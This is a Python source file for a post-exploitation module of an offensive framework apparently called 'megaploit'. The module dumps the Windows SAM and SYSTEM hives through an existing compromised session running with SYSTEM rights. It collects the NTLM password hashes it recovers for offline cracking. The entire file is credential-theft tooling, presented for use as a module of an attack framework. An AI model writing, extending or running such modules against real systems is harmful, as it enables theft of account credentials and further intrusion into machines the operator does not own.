"""megaploit.modules.post.windows.gather.hashdump — dump SAM/SYSTEM hashes (needs SYSTEM)."""
from megaploit.modules.base import AgentModule, ModuleType, OptionType

class PostHashdump(AgentModule):
    name        = "post/windows/gather/hashdump"
    description = "Dump Windows SAM and SYSTEM hive for offline NTLM hash extraction (needs SYSTEM)"
    module_type = ModuleType.POST
    author      = "megaploit"
    references  = [
        "https://attack.mitre.org/techniques/T1003/002/",
    ]
    platform    = ["windows"]; arch = ["x64", "x86"]; rank = 400

    def _define_options(self) -> None:
        self._opt("SESSION", OptionType.INTEGER, required=True,
                  description="Session ID to target")

    def run(self, session=None) -> list:
        self.validate()
        sess = session or self.session
        if sess is None:
            from megaploit.modules.base import ModuleError
            raise ModuleError("No session — set SESSION <id>")
        self.results.clear()
        self._emit("[*] Dumping SAM/SYSTEM hashes (requires SYSTEM token)…")
        out = self._send("hashdump", sess)
        if "Access is denied" in out or "Error" in out:
            self._fail(f"hashdump failed: {out}")
        elif out.strip():
            hashes = [l for l in out.splitlines() if ":" in l]
            self._ok(f"Recovered {len(hashes)} hash(es)", hashes=hashes, raw=out)
        else:
            self._fail("hashdump returned no output")
        return self.results

MODULE = PostHashdump
